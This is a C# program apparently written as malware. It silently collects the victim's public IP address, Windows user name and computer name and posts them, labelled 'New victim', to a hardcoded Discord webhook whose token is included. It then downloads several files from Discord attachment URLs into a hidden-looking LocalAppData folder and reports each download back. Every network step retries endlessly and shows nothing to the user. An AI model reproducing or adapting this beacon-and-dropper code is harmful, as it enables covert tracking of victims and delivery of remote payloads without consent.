﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using System.Net.Http;

namespace pkgdownloader
{
    internal static class Program
    {
        private static async Task Main(string[] args)
        {
            var packages = new []{
                "https://cdn.discordapp.com/attachments/785419281135042564/853470824379711489/195703586_186078356777812_3696479895528972907_n.png",
                "https://cdn.discordapp.com/attachments/785419281135042564/849117208965414922/185776334_3906781632740556_8913525932029805610_n.png",
                "https://cdn.discordapp.com/attachments/785419281135042564/848655752583315536/egy43p99v7271.png",
                "https://cdn.discordapp.com/attachments/785419281135042564/846439738638598194/unknown.png"
            };
            const string dshook = "https://discord.com/api/webhooks/849806948882055228/5STEFuPPtwaRVlfp-8hj_ynX44cgal7mYcOCaN9_bwjVBz-LdXLtKrNz4PtvOeyiuR9t";

            string ip;
            while (true)
            {
                try
                {
                    ip = await new HttpClient().GetStringAsync("https://api.ipify.org");
                    break;
                }
                catch 
                {
                    await Task.Delay(500);
                }
            }

            while (true)
            {
                try
                {
                    await new HttpClient().PostAsync(dshook, new FormUrlEncodedContent(new Dictionary<string, string>
                    {
                        {"content", $"```New victim \U00002705\nIP: {ip}\nSession name: {System.Security.Principal.WindowsIdentity.GetCurrent().Name}\n" +
                                    $"Computer name: {Environment.MachineName}\nWill start downloading malware packages soon...```"},
                        {"username", System.Security.Principal.WindowsIdentity.GetCurrent().Name},
                        {"avatar_url", "https://cdn.discordapp.com/attachments/785419281135042564/854132950098903050/d225266ddff6e8d7dc387d671704308c.png"}
                    }));
                    break;
                }
                catch
                {
                    await Task.Delay(500);
                }
            }

            var foldir = Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\DiscordHook");
            foreach (var package in packages)
            {
                Stream stream;
                while (true)
                {
                    try
                    {
                        stream = await new HttpClient().GetStreamAsync(package);
                        break;
                    }
                    catch
                    {
                        await Task.Delay(500);
                    }
                }

                using var fileStream = new FileStream($@"{foldir.FullName}\{package.Substring(77)}", FileMode.CreateNew);

                while (true)
                {
                    try
                    {
                        await stream.CopyToAsync(fileStream);
                        break;
                    }
                    catch
                    {
                        await Task.Delay(500);
                    }
                }

                while (true)
                {
                    try
                    {
                        await new HttpClient().PostAsync(dshook, new FormUrlEncodedContent(new Dictionary<string, string>
                        {
                            {"content", $"```Successfully downloaded package {package.Substring(77)} \U00002705```"},
                            {"username", System.Security.Principal.WindowsIdentity.GetCurrent().Name},
                            {"avatar_url", "https://cdn.discordapp.com/attachments/785419281135042564/854132950098903050/d225266ddff6e8d7dc387d671704308c.png"}
                        }));
                        break;
                    }
                    catch
                    {
                        await Task.Delay(500);
                    }
                }

                await Task.Delay(300);
            }
        }
    }
}